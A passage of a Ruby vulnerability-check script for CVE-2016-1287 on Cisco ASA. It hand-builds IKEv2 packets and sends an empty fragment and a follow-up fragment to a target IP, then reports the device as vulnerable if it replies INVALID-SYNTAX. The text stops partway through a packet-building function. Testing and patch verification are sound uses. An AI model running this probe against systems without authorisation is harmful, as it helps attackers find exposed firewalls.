#!/usr/bin/env ruby

=begin

JoSko - 12.06.2016

Standalone test for CVE-2016-1287 (Cisco ASA invalid IKE Fragmentation). Requires packetfu and pcaprub gems. Pcaprub relies on libpcap,
which you most likely already have, but it's a dependency nonetheless. Install libs, set the interface, run as root/sudo. 

Will require super-user/root permissions to bind to the socket and open UDP 500.

Install libpcap-dev if packetfu and pcaprub error on install


Operation:
- Establishes a valid IKE_SA_INIT with target
- Sends an empty fragment to the ASA
- Sends a second fragment to the ASA

Test:
- If patched, the ASA will drop the first fragement as it is invalid (empty). 
- If patched, the ASA will drop the second fragment as there is no valid first fragment to build on.
- If unpatched, the ASA will allow the first fragment, allow the second, and send an INVALID-SYNTAX notification as combined they do not make sense.
- No response => patched 
- INVALID-SYNTAX => vulnerable

Example usage:
  $ sudo ./cisco-ike-frag-test.rb 192.168.1.1
  [+] Sending IKE Initialization packet to 192.168.1.1
  [+] Session established, using Responder SPI: 9746b216c3d865ff
  [+] Sending IKE Fragmentation packets...
  [!] Recieved INVALID-SYNTAX notification
  
  [!] 192.168.1.1 is VULNERABLE

=end


require 'packetfu'  #gem install packetfu
require 'pcaprub'   #gem install pcaprub

# ~~~~~~~ SPECIFY YOUR INTERFACE ~~~~~~~
$int = "en0"
# ~~~~~~~ THANK YOU ~~~~~~~


$target = ARGV[0]

begin
  #Auto config the interface, source IP, and source MAC
  $config = PacketFu::Config.new(PacketFu::Utils.whoami?(:iface=> $int)).config  #Set interface
rescue
  #If auto config fails on your box, you can manually create the config:
  puts "PacketFu failed to set up interface automatically."
  puts "Be sure to update the source with your IP and MAC..."
  $config = PacketFu::Config.new(
    :iface => $int,
    :eth_saddr => "PUT YOUR MAC ADDRESS HERE",
    :ip_saddr => "PUT YOUR IP ADDRESS HERE",
    ).config
end

if $config[:ip_saddr] == "PUT YOUR IP ADDRESS HERE"
  puts "\nInvalid IP address in manual config... exiting..."
  exit
else
  $ip_saddr = $config[:ip_saddr]
end


def pkt1
#Build Packet
  #Build Eth header
  pkt1 = PacketFu::UDPPacket.new(:config  => $config)
  pkt1.eth_proto
  #Build IP header
  pkt1.ip_v     = 4                                  #IP header: IPv4
  pkt1.ip_hl    = 5                                  #IP header: IP header length
  pkt1.ip_tos   = 0                                  #IP header: Type of service 
  pkt1.ip_len   = 492                                #IP header: Total length
  pkt1.ip_id    = 49896                              #IP header: Identification
  pkt1.ip_frag  = 0                                  #IP header: Fragmentation
  pkt1.ip_ttl   = 64                                 #IP header: TTL = 64 (default)
  pkt1.ip_proto = 17                                 #IP header: Protocol = udp (17)
  pkt1.ip_sum                                        #IP header: Header Checksum
  pkt1.ip_saddr = $ip_saddr                          #IP header: Source IP
  pkt1.ip_daddr = $target                            #IP header: Destination IP
  #Build UDP header
  pkt1.udp_src  = rand(0xffff-1024)  + 1024          #UDP Header: Source Port
  pkt1.udp_dst  = 500                                #UDP Header: Destination Port
  #Build ISAKMP header
  pkt1.payload  = ["0102030405060708"].pack('H*')    #ISAKMP Header: Initiator SPI
  pkt1.payload += ["0000000000000000"].pack('H*')    #ISAKMP Header: Responder SPI
  pkt1.payload += ["21"].pack('H*')                  #ISAKMP Header: Next Payload: Security Association (33)
  pkt1.payload += ["20"].pack('H*')                  #ISAKMP Header: Version: 2.0
  pkt1.payload += ["22"].pack('H*')                  #ISAKMP Header: Exchange type: IKE_SA_INIT (34)
  pkt1.payload += ["08"].pack('H*')                  #ISAKMP Header: Flags: Initiator
  pkt1.payload += ["00000000"].pack('H*')            #ISAKMP Header: Message ID
  pkt1.payload += ["000001d0"].pack('H*')            #ISAKMP Header: Length: 464
  pkt1.payload += ["22"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: Key Exchange (34)
  pkt1.payload += ["00"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: Critical Bit: Not Critical
  pkt1.payload += ["00f4"].pack('H*')                #ISAKMP Header: ISAKMP Payload: Payload length: 244
  pkt1.payload += ["00"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal
  pkt1.payload += ["00"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Critical Bit
  pkt1.payload += ["00f0"].pack('H*')                #ISAKMP Header: ISAKMP Payload: SA Payload: Payload Length
  pkt1.payload += ["01"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal number
  pkt1.payload += ["01"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Protocol ID: IKE (1)
  pkt1.payload += ["00"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: SPI size: 0
  #Transforms
  #ENCR_DES
  pkt1.payload += ["1b"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Transforms: 27
  pkt1.payload += ["03"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Next Payload
  pkt1.payload += ["00"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Critical Bit
  pkt1.payload += ["0008"].pack('H*')                #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Payload Length
  pkt1.payload += ["01"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform Type
  pkt1.payload += ["000002"].pack('H*')              #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform ID: ENCR_DES (2)
  #ENCR_3DES
  pkt1.payload += ["03"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Next Payload
  pkt1.payload += ["00"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Critical Bit
  pkt1.payload += ["0008"].pack('H*')                #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Payload Length
  pkt1.payload += ["01"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform Type
  pkt1.payload += ["000003"].pack('H*')              #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform ID: ENCR_3DES (3)
  #ENCR_NULL
  pkt1.payload += ["03"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Next Payload
  pkt1.payload += ["00"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Critical Bit
  pkt1.payload += ["0008"].pack('H*')                #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Payload Length
  pkt1.payload += ["01"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform Type
  pkt1.payload += ["00000b"].pack('H*')              #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform ID: ENCR_NULL (11)
  #ENCR_AES_CBC
  pkt1.payload += ["03"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Next Payload
  pkt1.payload += ["00"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Critical Bit
  pkt1.payload += ["0008"].pack('H*')                #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Payload Length
  pkt1.payload += ["01"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform Type
  pkt1.payload += ["00000c"].pack('H*')              #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform ID: ENCR_AES_CBC (12)
  #ENCR_AES_CBC 192
  pkt1.payload += ["03"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Next Payload
  pkt1.payload += ["00"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Critical Bit
  pkt1.payload += ["000c"].pack('H*')                #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Payload Length
  pkt1.payload += ["01"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform Type
  pkt1.payload += ["00000c"].pack('H*')              #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform ID: ENCR_AES_CBC (12)
  pkt1.payload += ["800e"].pack('H*')                #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform IKE2 Attribute Type
  pkt1.payload += ["00c0"].pack('H*')                #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform IKE2 Key Length: 192
  #ENCR_AES_CBC 256
  pkt1.payload += ["03"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Next Payload
  pkt1.payload += ["00"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Critical Bit
  pkt1.payload += ["000c"].pack('H*')                #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Payload Length
  pkt1.payload += ["01"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform Type
  pkt1.payload += ["00000c"].pack('H*')              #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform ID: ENCR_AES_CBC (12)
  pkt1.payload += ["800e"].pack('H*')                #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform IKE2 Attribute Type
  pkt1.payload += ["1000"].pack('H*')                #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform IKE2 Key Length: 256
  #ENCR_AES_GCM
  pkt1.payload += ["03"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Next Payload
  pkt1.payload += ["00"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Critical Bit
  pkt1.payload += ["0008"].pack('H*')                #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Payload Length
  pkt1.payload += ["01"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform Type
  pkt1.payload += ["000014"].pack('H*')              #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform ID: AES-GCM with a 16 octet ICV (20)
  #ENCR_AES_GCM 192
  pkt1.payload += ["03"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Next Payload
  pkt1.payload += ["00"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Critical Bit
  pkt1.payload += ["000c"].pack('H*')                #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Payload Length
  pkt1.payload += ["01"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform Type
  pkt1.payload += ["000014"].pack('H*')              #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform ID: AES-GCM with a 16 octet ICV (20)
  pkt1.payload += ["800e"].pack('H*')                #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform IKE2 Attribute Type
  pkt1.payload += ["00c0"].pack('H*')                #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform IKE2 Key Length: 256
  #ENCR_AES_GCM 256
  pkt1.payload += ["03"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Next Payload
  pkt1.payload += ["00"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Critical Bit
  pkt1.payload += ["000c"].pack('H*')                #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Payload Length
  pkt1.payload += ["01"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform Type
  pkt1.payload += ["000014"].pack('H*')              #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform ID: AES-GCM with a 16 octet ICV (20)
  pkt1.payload += ["800e"].pack('H*')                #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform IKE2 Attribute Type
  pkt1.payload += ["1000"].pack('H*')                #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform IKE2 Key Length: 256
  #AUTH_HMAC_MD5_96
  pkt1.payload += ["03"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Next Payload
  pkt1.payload += ["00"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Critical Bit
  pkt1.payload += ["0008"].pack('H*')                #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Payload Length
  pkt1.payload += ["03"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform Type
  pkt1.payload += ["000001"].pack('H*')              #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform ID: AUTH_HMAC_MD5_96
  #AUTH_HMAC_SHA1_96
  pkt1.payload += ["03"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Next Payload
  pkt1.payload += ["00"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Critical Bit
  pkt1.payload += ["0008"].pack('H*')                #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Payload Length
  pkt1.payload += ["03"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform Type
  pkt1.payload += ["000002"].pack('H*')              #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform ID: AUTH_HMAC_SHA1_96
  #AUTH_HMAC_SHA2_256_128
  pkt1.payload += ["03"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Next Payload
  pkt1.payload += ["00"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Critical Bit
  pkt1.payload += ["0008"].pack('H*')                #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Payload Length
  pkt1.payload += ["03"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform Type
  pkt1.payload += ["00000c"].pack('H*')              #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform ID: AUTH_HMAC_SHA2_256_128
  #AUTH_HMAC_SHA2_384_192
  pkt1.payload += ["03"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Next Payload
  pkt1.payload += ["00"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Critical Bit
  pkt1.payload += ["0008"].pack('H*')                #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Payload Length
  pkt1.payload += ["03"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform Type
  pkt1.payload += ["00000d"].pack('H*')              #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform ID: AUTH_HMAC_SHA2_384_192
  #AUTH_HMAC_SHA2_512_256
  pkt1.payload += ["03"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Next Payload
  pkt1.payload += ["00"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Critical Bit
  pkt1.payload += ["0008"].pack('H*')                #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Payload Length
  pkt1.payload += ["03"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform Type
  pkt1.payload += ["00000e"].pack('H*')              #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform ID: AUTH_HMAC_SHA2_512_256
  #D-H 768-bit MODP Group
  pkt1.payload += ["03"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Next Payload
  pkt1.payload += ["00"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Critical Bit
  pkt1.payload += ["0008"].pack('H*')                #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Payload Length
  pkt1.payload += ["04"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform Type
  pkt1.payload += ["000001"].pack('H*')              #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform ID: D-H 768-bit MODP Group
  #D-H 1024-bit MODP Group
  pkt1.payload += ["03"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Next Payload
  pkt1.payload += ["00"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Critical Bit
  pkt1.payload += ["0008"].pack('H*')                #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Payload Length
  pkt1.payload += ["04"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform Type
  pkt1.payload += ["000002"].pack('H*')              #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform ID: D-H 1024-bit MODP Group
  #D-H 1536-bit MODP Group
  pkt1.payload += ["03"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Next Payload
  pkt1.payload += ["00"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Critical Bit
  pkt1.payload += ["0008"].pack('H*')                #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Payload Length
  pkt1.payload += ["04"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform Type
  pkt1.payload += ["000005"].pack('H*')              #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform ID: D-H 1536-bit MODP Group
  #D-H 2048-bit MODP Group
  pkt1.payload += ["03"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Next Payload
  pkt1.payload += ["00"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Critical Bit
  pkt1.payload += ["0008"].pack('H*')                #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Payload Length
  pkt1.payload += ["04"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform Type
  pkt1.payload += ["00000e"].pack('H*')              #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform ID: D-H 2048-bit MODP Group
  #D-H 256-bit random ECP Group
  pkt1.payload += ["03"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Next Payload
  pkt1.payload += ["00"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Critical Bit
  pkt1.payload += ["0008"].pack('H*')                #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Payload Length
  pkt1.payload += ["04"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform Type
  pkt1.payload += ["000013"].pack('H*')              #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform ID: D-H 256-bit random ECP Group
  #D-H 384-bit random ECP Group
  pkt1.payload += ["03"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Next Payload
  pkt1.payload += ["00"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Critical Bit
  pkt1.payload += ["0008"].pack('H*')                #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Payload Length
  pkt1.payload += ["04"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform Type
  pkt1.payload += ["000014"].pack('H*')              #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform ID: D-H 384-bit random ECP Group  
  #D-H 512-bit random ECP Group
  pkt1.payload += ["03"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Next Payload
  pkt1.payload += ["00"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Critical Bit
  pkt1.payload += ["0008"].pack('H*')                #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Payload Length
  pkt1.payload += ["04"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform Type
  pkt1.payload += ["000015"].pack('H*')              #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform ID: D-H 512-bit random ECP Group
  #D-H 2048-bit MODP Group with 256-bit Prime Order Subgroup
  pkt1.payload += ["03"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Next Payload
  pkt1.payload += ["00"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Critical Bit
  pkt1.payload += ["0008"].pack('H*')                #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Payload Length
  pkt1.payload += ["04"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform Type
  pkt1.payload += ["000018"].pack('H*')              #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform ID: D-H 256-bit random ECP Group
  #PRF_HMAC_MD5
  pkt1.payload += ["03"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Next Payload
  pkt1.payload += ["00"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Critical Bit
  pkt1.payload += ["0008"].pack('H*')                #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Payload Length
  pkt1.payload += ["02"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform Type
  pkt1.payload += ["000001"].pack('H*')              #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform ID: PRF_HMAC_MD5
  #PRF_HMAC_SHA1
  pkt1.payload += ["03"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Next Payload
  pkt1.payload += ["00"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Critical Bit
  pkt1.payload += ["0008"].pack('H*')                #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Payload Length
  pkt1.payload += ["02"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform Type
  pkt1.payload += ["000002"].pack('H*')              #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform ID: PRF_HMAC_SHA1
  #PRF_HMAC_SHA2_256
  pkt1.payload += ["03"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Next Payload
  pkt1.payload += ["00"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Critical Bit
  pkt1.payload += ["0008"].pack('H*')                #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Payload Length
  pkt1.payload += ["02"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform Type
  pkt1.payload += ["000005"].pack('H*')              #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform ID: PRF_HMAC_SHA2_256
  #PRF_HMAC_SHA2_384
  pkt1.payload += ["03"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Next Payload
  pkt1.payload += ["00"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Critical Bit
  pkt1.payload += ["0008"].pack('H*')                #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Payload Length
  pkt1.payload += ["02"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform Type
  pkt1.payload += ["000006"].pack('H*')              #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform ID: PRF_HMAC_SHA2_384
  #PRF_HMAC_SHA2_512
  pkt1.payload += ["03"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Next Payload
  pkt1.payload += ["00"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Critical Bit
  pkt1.payload += ["0008"].pack('H*')                #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Payload Length
  pkt1.payload += ["02"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform Type
  pkt1.payload += ["000007"].pack('H*')              #ISAKMP Header: ISAKMP Payload: SA Payload: Proposal Payload: Transform ID: PRF_HMAC_SHA2_512
  #Key Exchange
  pkt1.payload += ["28"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: Next Payload
  pkt1.payload += ["00"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: Critical Bit
  pkt1.payload += ["0088"].pack('H*')                #ISAKMP Header: ISAKMP Payload: Payload Length
  pkt1.payload += ["0002"].pack('H*')                #ISAKMP Header: ISAKMP Payload: DH Group #: 1024-bit MODP group
  pkt1.payload += ["0000"].pack('H*')                #ISAKMP Header: ISAKMP Payload: 
  pkt1.payload += ["0" * 128].pack('H*')             #ISAKMP Header: ISAKMP Payload: Key Exchange Data
  pkt1.payload += ["0102030405060708" * 8].pack('H*')#ISAKMP Header: ISAKMP Payload: Key Exchange Data
  #Nonce
  pkt1.payload += ["2b"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: Vendor ID
  pkt1.payload += ["00"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: Critical Bit
  pkt1.payload += ["0024"].pack('H*')                #ISAKMP Header: ISAKMP Payload: Payload Length
  pkt1.payload += ["0102030405060708"].pack('H*')    #ISAKMP Header: ISAKMP Payload: Nonce DATA
  pkt1.payload += ["0910111213141516"].pack('H*')    #ISAKMP Header: ISAKMP Payload: Nonce DATA  
  pkt1.payload += ["0102030405060708"].pack('H*')    #ISAKMP Header: ISAKMP Payload: Nonce DATA
  pkt1.payload += ["0910111213141516"].pack('H*')    #ISAKMP Header: ISAKMP Payload: Nonce DATA  
  #Vendor I
  pkt1.payload += ["00"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: Next Payload
  pkt1.payload += ["00"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: Critical Bit
  pkt1.payload += ["0014"].pack('H*')                #ISAKMP Header: ISAKMP Payload: Payload Length
  pkt1.payload += ["4048b7d56ebce885"].pack('H*')    #ISAKMP Header: ISAMKMP Payload: Vendor ID 1/2
  pkt1.payload += ["25e7de7f00d6c2d3"].pack('H*')    #ISAKMP Header: ISAMKMP Payload: Vendor ID 2/2
  pkt1.recalc                                        #Recalculate entire packet
  return pkt1
end


def pkt3 (init, resp_spi)
#Build Packet
  #Build Eth header
  pkt3 = PacketFu::UDPPacket.new(:config  => $config)
  pkt3.eth_proto
  #Build IP header
  pkt3.ip_v     = 4                                  #IP header: IPv4
  pkt3.ip_hl    = 5                                  #IP header: IP header length
  pkt3.ip_tos   = 0                                  #IP header: Type of service 
  pkt3.ip_len   = 64                                 #IP header: Total length
  pkt3.ip_id    = 24407                              #IP header: Identification
  pkt3.ip_frag  = 0                                  #IP header: Fragmentation
  pkt3.ip_ttl   = 64                                 #IP header: TTL = 64 (default)
  pkt3.ip_proto = 17                                 #IP header: Protocol = udp (17)
  pkt3.ip_sum                                        #IP header: Header Checksum
  pkt3.ip_saddr = $ip_saddr                          #IP header: Source IP
  pkt3.ip_daddr = $target                            #IP header: Destination IP
  #Build UDP header
  pkt3.udp_src  = init.udp_src                       #UDP Header: Source Port
  pkt3.udp_dst  = 500                                #UDP Header: Destination Port
  #Build ISAKMP header
  pkt3.payload  = ["0102030405060708"].pack('H*')    #ISAKMP Header: Initiator SPI
  pkt3.payload += [resp_spi].pack('H*')              #ISAKMP Header: Responder SPI
  pkt3.payload += ["84"].pack('H*')                  #ISAKMP Header: Next Payload: Cisco-Fragmentation (132)
  pkt3.payload += ["20"].pack('H*')                  #ISAKMP Header: Version: 2.0
  pkt3.payload += ["23"].pack('H*')                  #ISAKMP Header: Exchange type: IKE_AUTH (35)
  pkt3.payload += ["08"].pack('H*')                  #ISAKMP Header: Flags: Initiator
  pkt3.payload += ["00000001"].pack('H*')            #ISAKMP Header: Message ID
  pkt3.payload += ["00000024"].pack('H*')            #ISAKMP Header: Length: 36
  pkt3.payload += ["00"].pack('H*')                  #ISAKMP Header: Type Payload: Cisco-Fragmentation (132)
  pkt3.payload += ["00"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: Critical Bit: Not Critical
  pkt3.payload += ["0008"].pack('H*')                #ISAKMP Header: ISAKMP Payload: Payload length: 8
  pkt3.payload += ["0001"].pack('H*')                #ISAKMP Header: ISAKMP Payload: Frag ID
  pkt3.payload += ["01"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: Frag seq
  pkt3.payload += ["00"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: Frag last
  pkt3.recalc                                        #Recalculate entire packet
  return pkt3
end


def pkt4 (init, resp_spi)
#Build Packet
  #Build Eth header
  pkt4 = PacketFu::UDPPacket.new(:config  => $config)
  pkt4.eth_proto
  #Build IP header
  pkt4.ip_v     = 4                                  #IP header: IPv4
  pkt4.ip_hl    = 5                                  #IP header: IP header length
  pkt4.ip_tos   = 0                                  #IP header: Type of service 
  pkt4.ip_len   = 112                                #IP header: Total length
  pkt4.ip_id    = 32234                              #IP header: Identification
  pkt4.ip_frag  = 0                                  #IP header: Fragmentation
  pkt4.ip_ttl   = 64                                 #IP header: TTL = 64 (default)
  pkt4.ip_proto = 17                                 #IP header: Protocol = udp (17)
  pkt4.ip_sum                                        #IP header: Header Checksum
  pkt4.ip_saddr = $ip_saddr                          #IP header: Source IP
  pkt4.ip_daddr = $target                            #IP header: Destination IP
  #Build UDP header
  pkt4.udp_src  = init.udp_src                       #UDP Header: Source Port
  pkt4.udp_dst  = 500                                #UDP Header: Destination Port
  #Build ISAKMP header
  pkt4.payload  = ["0102030405060708"].pack('H*')    #ISAKMP Header: Initiator SPI
